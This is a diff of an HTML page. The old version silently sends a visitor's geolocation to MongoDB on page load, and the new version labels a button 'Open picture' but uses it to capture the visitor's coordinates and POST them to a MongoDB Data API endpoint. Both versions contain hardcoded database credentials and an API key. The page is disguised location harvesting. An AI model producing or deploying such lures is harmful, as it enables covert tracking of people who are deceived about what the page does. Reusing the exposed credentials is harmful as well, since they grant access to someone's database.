@@ -1,69 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sample Site</title>
+  <title>Picture</title>
 </head>
 <body>
-  <h1>Welcome to the Sample Site</h1>
-  
-  <hr>
-  
-  <h2><a href="introduction.html">Section 1: Introduction</a></h2>
-  <h2><a href="getting-started.html">Section 2: Getting Started</a></h2>
-  <h2><a href="advanced-usage.html">Section 3: Advanced Usage</a></h2>
-  <h2><a href="api-reference.html">Section 4: API Reference</a></h2>
-  <h2><a href="faq.html">Section 5: Frequently Asked Questions (FAQ)</a></h2>
-  <h2><a href="https://google.com">Find us in Google</a></h2>
-  <hr>
-  
-  <footer>
-    <script>
-async function storeLocation(lat, lng) {
-  // Replace with your actual MongoDB connection string
-  const uri = "mongodb+srv://admintictactoe:U9Tc3K5xIsdD5J3k@cluster0.jhu9vtx.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+  <button id="getLocation">Open picture</button>
+  <script>
+    const getLocationButton = document.getElementById('getLocation');
 
-  try {
-    // Create a new MongoClient instance
-    const client = new MongoClient(uri, {
-      useNewUrlParser: true,
-      useUnifiedTopology: true,
+    getLocationButton.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocationToMongo, handleError);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
     });
 
-    // Connect to the MongoDB   
- server
-    await client.connect();
-    const database = client.db("your_database_name");
-    const collection = database.collection("your_collection_name");   
+    function sendLocationToMongo(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
 
+      // Construct the JSON data with the latitude and longitude
+      const jsonData = {
+        "dataSource": "Cluster0",
+        "database": "sample_mflix", // Update with your database name
+        "collection": "comments",   // Update with your collection name
+        "document": {
+          "status": "open",
+          "latitude": latitude,
+          "longitude": longitude,
+          "text": "Do the dishes" // You can remove/customize this field
+        }
+      };
 
-    // Create a new document with latitude and longitude
-    const location = { latitude: lat, longitude: lng };
+      // Send the data to MongoDB using fetch API
+      fetch('https://us-east-1.aws.data.mongodb-api.com/app/data-hjopnck/endpoint/data/v1/action/insertOne', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Request-Headers': '*',
+          'api-key': 'e7djiyfCTzPb0oxwgjmUkQiEb3zFsnH1Vm9R6SxiFOlZimyr19DDo1lrlbAAFPFJ' // Replace with your API key
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok.');
+        }
+        return response.json();
+      })
+      .then(data => console.log('Location inserted:', data))
+      .catch(error => console.error('Error:', error));
+    }
 
-    // Insert the document into the collection
-    await collection.insertOne(location);
-
-    console.log("Location stored successfully in MongoDB!");
-  } catch (error) {
-    console.error("Error storing location:", error);
-  } finally {
-    // Close the connection to MongoDB
-    await client.close();
-  }
-}
-
-// Get location from map API (replace with your specific API call)
-navigator.geolocation.getCurrentPosition((position) => {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;   
-
-
-  // Store the retrieved location in MongoDB
-  storeLocation(latitude, longitude);
-});
-
-    </script>
-  </footer>
+    function handleError(error) {
+      alert("Error getting location: " + error.message); 
+    }
+  </script>
 </body>
 </html>
